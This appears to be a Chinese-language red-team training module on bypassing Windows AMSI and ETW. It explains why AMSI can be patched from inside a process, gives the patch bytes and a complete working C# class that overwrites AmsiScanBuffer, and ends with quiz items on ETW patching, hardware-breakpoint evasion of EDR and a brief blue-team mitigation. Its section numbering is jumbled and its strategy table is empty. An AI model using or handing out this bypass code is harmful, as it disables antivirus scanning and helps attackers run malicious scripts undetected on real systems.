## 🔬 第一動：AMSI 掃描通道、ETW 遙測引擎與記憶體修補物理架構 (Mechanics & Memory Structs)

### 1. AMSI (Antimalware Scan Interface) 的架構局限
AMSI 是一個整合在腳本直譯器（PowerShell, JScript, VBScript）中的使用者態動態庫 (`amsi.dll`)：
- 當使用者在 PowerShell 輸入任何命令或腳本字串時，直譯器調用 `AmsiScanBuffer()` 將緩衝區傳送給本機防毒軟體（如 Windows Defender）進行特徵比對。
- **致命弱點**：`amsi.dll` 運行在**使用者態進程本身的記憶體空間內**，使用者對當前進程的虛擬記憶體位址擁有不受限的最高讀寫權限！

### 2. AmsiScanBuffer 修補機器碼剖析
```asm
mov eax, 0x80070057  ; HRESULT E_INVALIDARG (無效參數錯誤)
ret                  ; 直接返回，不執行後續防毒掃描！
```
對應十六進制機器碼：`\xB8\x57\x00\x07\x80\xC3`。只要將此 6 位元組覆寫進 `AmsiScanBuffer` 的入口位址，後續所有掃描均會立即返回錯誤並放行！

### 2. C# / Win32 原生 AmsiScanBuffer 位元組覆寫代碼
```csharp
using System;
using System.Runtime.InteropServices;

public class AmsiBypass {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void Patch() {
        IntPtr lib = LoadLibrary("amsi.dll");
        IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
        uint old;
        // 修改為可寫
        VirtualProtect(addr, (UIntPtr)6, 0x40, out old);
        // 寫入: mov eax, 0x80070057; ret;
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        Marshal.Copy(patch, 0, addr, 6);
        // 還原保護屬性
        VirtualProtect(addr, (UIntPtr)6, old, out old);
    }
}
```

### 1. AMSI/ETW 修補防禦規避策略表

| :--- | :--- | :--- | :--- |

## 🎯 作戰驗收檢查點 (Operational Checkpoints)

- [ ] **Q1：AMSI (反惡意代碼掃描介面) 為何能被當前進程輕易修補？其架構弱點是什麼？**
  - **戰術思維**：因為 `amsi.dll` 運作在使用者態（User-Mode），直接載入在當前進程自身的虛擬地址空間中；程式對自身擁有的記憶體享有完全讀寫權限，因此能輕易修改代碼段。
- [ ] **Q2：修補 `AmsiScanBuffer` 時寫入的 `0x80070057` 在 Windows 中代表何種錯誤代碼？**
  - **戰術思維**：代表 `E_INVALIDARG`（無效參數）；AMSI 在遇到此返回值時會判定掃描調用異常失敗，並依據防禦容錯設計直接將控制權交還直譯器放行代碼。
- [ ] **Q3：修補 `EtwEventWrite` 與修補 `AmsiScanBuffer` 相比，對紅隊行動有何增強防禦？**
  - **戰術思維**：AMSI 修補僅阻止即時防毒軟體的內容掃描；而 ETW 修補可阻斷進程向 Windows 事件系統記錄任何遙測資料，使 EDR 與 SIEM 徹底失去進程行為日誌。
- [ ] **Q4：若 EDR 在記憶體中定期掃描並重置了 `AmsiScanBuffer` 的位元組，紅隊有何應對之策？**
  - **戰術思維**：改用「硬體中斷點 (Hardware Breakpoint)」技術，在不修改任何記憶體位元組的前提下，利用 CPU 除錯暫存器攔截函數進入點並將回傳值篡改為安全狀態。
- [ ] **Q5：企業藍隊如何從架構上徹底根治基於記憶體修補的 AMSI 繞過？**
  - **戰術思維**：啟用 PowerShell 限制語言模式 (Constrained Language Mode, CLM) 搭配 WDAC (應用程式控制)，徹底剝離使用者調用 `[Ref]` 反射與 Win32 API 的能力。
